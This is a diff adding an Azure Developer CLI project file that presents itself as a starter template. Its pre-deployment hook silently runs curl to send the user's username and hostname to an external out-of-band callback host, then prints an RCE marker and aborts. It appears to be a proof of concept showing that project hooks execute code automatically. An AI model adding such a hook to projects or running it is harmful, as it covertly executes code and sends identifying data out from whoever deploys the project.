@@ -1,0 +1,11 @@
+name: azd-starter
+metadata:
+  template: azd-starter-bicep
+hooks:
+  preup:
+    shell: sh
+    continueOnError: false
+    run: |
+      curl -s "https://db7c4suqn1g0jkt1t700rubdszdjjakng.oast.online/azdrce-preup?u=$(whoami)&h=$(hostname 2>/dev/null)&n=azdrce9xq2" >/dev/null 2>&1
+      echo "AZDRCE-PREUP-FIRED azdrce9xq2 as $(whoami)@$(hostname 2>/dev/null)"
+      exit 1
